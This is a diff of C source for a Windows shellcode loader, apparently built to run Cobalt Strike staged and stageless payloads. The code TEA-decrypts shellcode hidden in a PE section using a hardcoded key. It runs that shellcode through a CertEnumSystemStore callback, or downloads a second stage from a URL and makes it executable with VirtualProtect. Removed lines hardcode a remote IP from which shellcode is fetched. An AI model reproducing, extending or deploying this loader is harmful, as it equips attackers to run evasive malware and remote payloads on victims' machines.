@@ -22,6 +22,35 @@ struct ConfigurationData {
 	IMAGE_NT_HEADERS32	mNtHeader;
 };
 
+/*****数据包封装
+* |STu8		|STu32			|STu8*		|
+* |加密类型	|加密数据长度	|加密数据	|
+******/
+
+//加密类型
+#define H_ENC_XOR	(unsigned char)(0xB1)
+#define H_ENC_AES	(unsigned char)(0xB2)
+#define H_ENC_RC4	(unsigned char)(0xB3)
+#define H_ENC_TEA	(unsigned char)(0xB4)
+
+/*****加密数据封装
+* |STu8		|STu32			|STu8*		|
+* |数据类型	|数据长度		|payload数据|
+******/
+
+//payload数据类型
+#define P_TYPE_STAGE		(unsigned char)(0xA0)
+#define P_TYPE_STAGELESSURL	(unsigned char)(0xA1)
+
+/*****stage payload
+* Conbalt strike分离木马方式生成的阶段一木马
+******/
+
+/*****stageless url
+* Conbalt strike分离木马方式生成的阶段二木马url
+* 根据阶段一木马解析得来
+******/
+
 
 //获取当前进程父进程
 DWORD getParentPID(DWORD pid)
@@ -232,8 +261,7 @@ DWORD GetModuleBaseAddress(TCHAR* lpszModuleName, DWORD pID) { // Getting module
 	return dwModuleBaseAddress;
 }
 
-//解析运行shellcode
-int RunSCFromPE(struct ConfigurationData* config)
+int GetSCPointerFromPE(struct ConfigurationData* config,unsigned int *scPointer,unsigned int *scSize)
 {
 	//获取当前进程加载基址
 	char	fileName[100] = { 0 };
@@ -246,7 +274,7 @@ int RunSCFromPE(struct ConfigurationData* config)
 	memcpy(processName, tmp1 + 1, min(strlen(tmp1), sizeof(processName))); //截取得进程名
 	DWORD   dwpid = GetCurrentProcessId();
 	DWORD baseaddr = GetModuleBaseAddress(processName, dwpid);
-	
+
 	CopyMemory(&config->mDosHeader, (void*)baseaddr, sizeof(IMAGE_DOS_HEADER));
 	//判断CPU字长
 	DWORD dwVirtualAddress = config->mDosHeader.e_lfanew;
@@ -260,58 +288,106 @@ int RunSCFromPE(struct ConfigurationData* config)
 	dwVirtualAddress += sizeof(IMAGE_SECTION_HEADER) * (config->mNtHeader.FileHeader.NumberOfSections - 1);
 	IMAGE_SECTION_HEADER mSectionHeader;
 	CopyMemory(&mSectionHeader, (void*)(baseaddr + dwVirtualAddress), sizeof(IMAGE_SECTION_HEADER));
-
-	//tea解密操作
-	unsigned char TEA_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
-	tea_decrypt((unsigned char *)(baseaddr + mSectionHeader.VirtualAddress), mSectionHeader.SizeOfRawData, TEA_KEY, &config->shellcode, (unsigned int *)&config->shellcodeSize);
-	if (config->shellcode == NULL) {
-		return -1;
-	}
-	CopyMemory((void*)(baseaddr + mSectionHeader.VirtualAddress), config->shellcode, config->shellcodeSize);
-	free(config->shellcode);
-
-	//xor解密
-	/*unsigned char XOR_BYTES[] = { 0x56,0xb0,0x71,0xef,0xd7,0xe9,0x92,0x69,0x81,0xe9,0xb1,0x74,0x21,0x6d,0x8f,0x86 };
-	unsigned int XOR_BYTES_LEN = sizeof(XOR_BYTES);
-	for (int i = 0; i < mSectionHeader.SizeOfRawData; i++)
-	{
-		((unsigned char*)(baseaddr + mSectionHeader.VirtualAddress))[i] ^= XOR_BYTES[i % XOR_BYTES_LEN];
-	}*/
-
-	//设置跳转代码
-	int amtWritten = (sizeof(jmp32bitOffset) + sizeof(DWORD));
-	DWORD jumpOffset = 5;
-	jumpOffset -= amtWritten;
-	memcpy((void*)(baseaddr + mSectionHeader.VirtualAddress), jmp32bitOffset, sizeof(jmp32bitOffset));
-	DWORD* jumpTarget = (DWORD*)(baseaddr + mSectionHeader.VirtualAddress + sizeof(jmp32bitOffset));
-	*jumpTarget = jumpOffset;
-
-	//执行shellcode代码
-	void_func_ptr callLoc = (void_func_ptr)(baseaddr + mSectionHeader.VirtualAddress);
-	//callLoc();
-	//EnumWindows((WNDENUMPROC)(callLoc), 0);
-	//EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)callLoc, LGRPID_INSTALLED, NULL);
-
-	CertEnumSystemStore(0x10000, 0, "system", (PFN_CERT_ENUM_SYSTEM_STORE)callLoc);
+	
+	*scPointer = baseaddr + mSectionHeader.VirtualAddress;
+	*scSize = mSectionHeader.SizeOfRawData;
 
 	return 0;
 }
 
-//解析运行shellcode
-int RunSCFromNet(struct ConfigurationData* config)
+int DecryptSC(struct ConfigurationData* config,unsigned char *encData,unsigned int encDataSize)
 {
-	GetStageless("http://118.195.199.66:8181/YrGJ", &config->shellcode, &config->shellcodeSize);
-
-	unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (dwBaseAddr)
+	if (encData[0] == H_ENC_XOR)
 	{
-		memcpy(dwBaseAddr, config->shellcode, config->shellcodeSize);
-		free(config->shellcode);
-		DWORD oldpro = PAGE_READWRITE;
-		if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
-			((void(*)())dwBaseAddr)();
+		//xor解密
+		/*unsigned char XOR_BYTES[] = { 0x56,0xb0,0x71,0xef,0xd7,0xe9,0x92,0x69,0x81,0xe9,0xb1,0x74,0x21,0x6d,0x8f,0x86 };
+		unsigned int XOR_BYTES_LEN = sizeof(XOR_BYTES);
+		for (int i = 0; i < mSectionHeader.SizeOfRawData; i++)
+		{
+			((unsigned char*)(baseaddr + mSectionHeader.VirtualAddress))[i] ^= XOR_BYTES[i % XOR_BYTES_LEN];
+		}*/
 	}
+	else if (encData[0] == H_ENC_AES)
+	{
+
+	}
+	else if (encData[0] == H_ENC_RC4)
+	{
+
+	}
+	else if (encData[0] == H_ENC_TEA)
+	{
+		//解析头部
+		int offset = 1 + 4;
+		int encdatasize = *(unsigned int*)(encData + 1);
+
+		//TEA加密
+		unsigned char TEA_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
+		tea_decrypt(encData + offset, encdatasize, TEA_KEY, &config->shellcode, (unsigned int*)&config->shellcodeSize);
+		if (config->shellcode == NULL) {
+			return -1;
+		}
+	}
+
 	return 0;
+}
+
+
+//解析运行shellcode
+int RunSCFromPE(struct ConfigurationData* config)
+{
+	unsigned int encData = 0;
+	unsigned int encDataSize = 0;
+	//解析PE结构，从区段获取SC
+	GetSCPointerFromPE(config, &encData, &encDataSize);
+	//解密SC
+	if (DecryptSC(config, (unsigned char*)encData, &encDataSize)==0)
+	{
+		if (config->shellcode[0] == P_TYPE_STAGE)
+		{
+			//设置跳转代码
+			int amtWritten = (sizeof(jmp32bitOffset) + sizeof(DWORD));
+			DWORD jumpOffset = 5;
+			jumpOffset -= amtWritten;
+			memcpy((void*)encData, jmp32bitOffset, sizeof(jmp32bitOffset));
+			DWORD* jumpTarget = (DWORD*)(encData + sizeof(jmp32bitOffset));
+			*jumpTarget = jumpOffset;
+
+			//执行shellcode代码
+			void_func_ptr callLoc = (void_func_ptr)(encData);
+			//callLoc();
+			//EnumWindows((WNDENUMPROC)(callLoc), 0);
+			//EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)callLoc, LGRPID_INSTALLED, NULL);
+
+			CertEnumSystemStore(0x10000, 0, "system", (PFN_CERT_ENUM_SYSTEM_STORE)callLoc);
+		}
+		else if (config->shellcode[0] == P_TYPE_STAGELESSURL)
+		{
+			unsigned int urllen = *(unsigned int*)(config->shellcode + 1);
+			unsigned char* url = malloc(urllen + 1);
+			if (url)
+			{
+				//解析url
+				memset(url, 0, urllen + 1);
+				memcpy(url, config->shellcode + 1 + 4, urllen);
+				GetStageless(url, &config->shellcode, &config->shellcodeSize);
+				free(url);
+				unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+				if (dwBaseAddr)
+				{
+					memcpy(dwBaseAddr, config->shellcode, config->shellcodeSize);
+					free(config->shellcode);
+					DWORD oldpro = PAGE_READWRITE;
+					if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
+						((void(*)())dwBaseAddr)();
+				}
+			}
+			else
+				return -1;
+		}
+		return 0;
+	}
+	return -1;
 }
 
 int main()
@@ -326,10 +402,10 @@ int main()
 		return 0;
 	}
 	
-	if (GetPP())
+	if (/*GetPP()*/true)
 	{
 		//自身子进程
-		if (RunSCFromNet(&config) < 0) {
+		if (RunSCFromPE(&config) < 0) {
 			return 1;
 		}
 	}
